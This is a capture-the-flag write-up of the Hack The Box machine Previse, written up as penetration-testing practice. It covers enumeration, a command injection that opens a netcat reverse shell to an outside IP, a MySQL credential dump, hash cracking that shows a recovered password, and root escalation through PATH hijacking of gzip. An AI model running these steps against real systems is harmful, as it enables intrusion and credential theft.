# Previse

Previse is an easy Linux machine that was released on 07/08/2021.

**Note**: this write-up is quite short and concise as it's based on really brief notes that were taken just for convenience during the pwning of the machine. 

## Enumeration

As usual we start by performing a port scan with nmap

```
nmap -A 10.10.11.104 -p- | tee portscan.txt

Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-14 19:22 EDT
Nmap scan report for previse.htb (10.10.11.104)
Host is up (0.048s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Previse Login
|_Requested resource was login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.89 seconds

```

We start with some enumeration on the http service using gobuster
```sh
gobuster dir -x php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://previse.htb
```
It shows some interesting files. Requesting the 200's in the browser does not seem to bring anything, so let's
examine the http reponses in Burp

nav.php looks interesting and reveals further interesting pages

               <a href="accounts.php">ACCOUNTS</a>

                        <li><a href="accounts.php">CREATE ACCOUNT</a></li>

            <li><a href="files.php">FILES</a></li>
                <a href="status.php">MANAGEMENT MENU</a>

                        <li><a href="file_logs.php">LOG DATA</a>

It seems like the accounts.php could be used to create another account

## Foothold
We find out that sernames and passwords must be between 5 and 32 characters

files.php is also interesting, as it shows a list of all the files uploaded on the site.

It shows a zip file uploaded by newguy, but it is not downloadable as we're not logged in


We can craft a sign-up post request from accounts.php, create our account and log in

From here, we can download the site backup

Browsing throuhg the site source we find sql creds

From the file_logs.php page, we can get a list of all the users that have downloaded files from the server.
The list includes other files beyond the site backup, but they seem not to be downloadable by just changing the GET parameter from the downloads.php page.

From the login.php file we notice that every password is hashed using the same salt

In logs.php there is a comment that says that parsing is done via a Python script called with exec(), which appears to be injectable

It is in fact injectable and from Burp we can inject a netcat reverse shell by appending

```sh
nc -e /bin/bash 10.0.0.1 4242
```
in the POST parameter

Once on the server, can improve our shell with 
```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

The user is `m4lwhere`
We cannot simply `su` to the user, so we have to find another way.

Remember that we have root credentials for MySQL, so let's try that path.
```sh
mysql -u root -p 
```
with the password found in config.php

and we successfully access the db

```
SELECT * FROM accounts;
+----+----------+------------------------------------+---------------------+
| id | username | password                           | created_at          |
+----+----------+------------------------------------+---------------------+
|  1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
|  2 | ooooo    | $1$🧂llol$zxN7/tbhdxnZK4XUb2i1h1 | 2021-10-30 18:07:28 |
|  3 | NAPOO    | $1$🧂llol$vMzw8Wgsgt1kSUp61WJ1V/ | 2021-10-30 18:09:20 |
|  4 | 12345    | $1$🧂llol$eBQMPwAvz9j9ZpK62qDI// | 2021-10-30 18:16:16 |
|  5 | penr0se1 | $1$🧂llol$79cV9c1FNnnr7LcfPFlqQ0 | 2021-10-30 18:18:06 |
|  6 | penr0se  | $1$🧂llol$79cV9c1FNnnr7LcfPFlqQ0 | 2021-10-30 18:18:51 |
+----+----------+------------------------------------+---------------------+
```

Let's try to crack the hash for m4lwhere
```sh
hashcat -a 0 -m 500 m4lwhere.hash ~/wordlists/rockyou.txt
```
And the password is

`$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!`

Now we can ssh into the machine as m4lwhere

## Privesc
We run linpeas.sh but nothing interesting shows up

If we run `sudo -l` we get
```
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
```

Let's check out the content of the script

gzip is being called with a relative path, so we can exploit that

Let's create a script called gzip in our pwd which will give us a shell

```sh
/bin/bash -i >&2
```

Now we add our pwd to the PATH env var with
```sh
export PATH=.:$PATH
```

and calling the access_backup.sh script with sudo will give us a root shell
